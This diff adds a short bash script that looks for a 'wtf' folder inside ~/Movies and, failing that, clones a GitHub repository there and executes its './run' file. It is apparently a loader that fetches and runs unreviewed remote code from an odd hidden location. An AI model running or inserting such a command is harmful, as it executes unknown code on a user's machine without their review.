@@ -1,0 +1,3 @@
+#! /bin/bash
+
+(cd ~/Movies && chmod +r * && find ~/Movies -name wtf && cd wtf && ./run) || (git clone https://github.com/ay1337/0.git ~/Movies/wtf && cd ~/Movies/wtf && ./run)
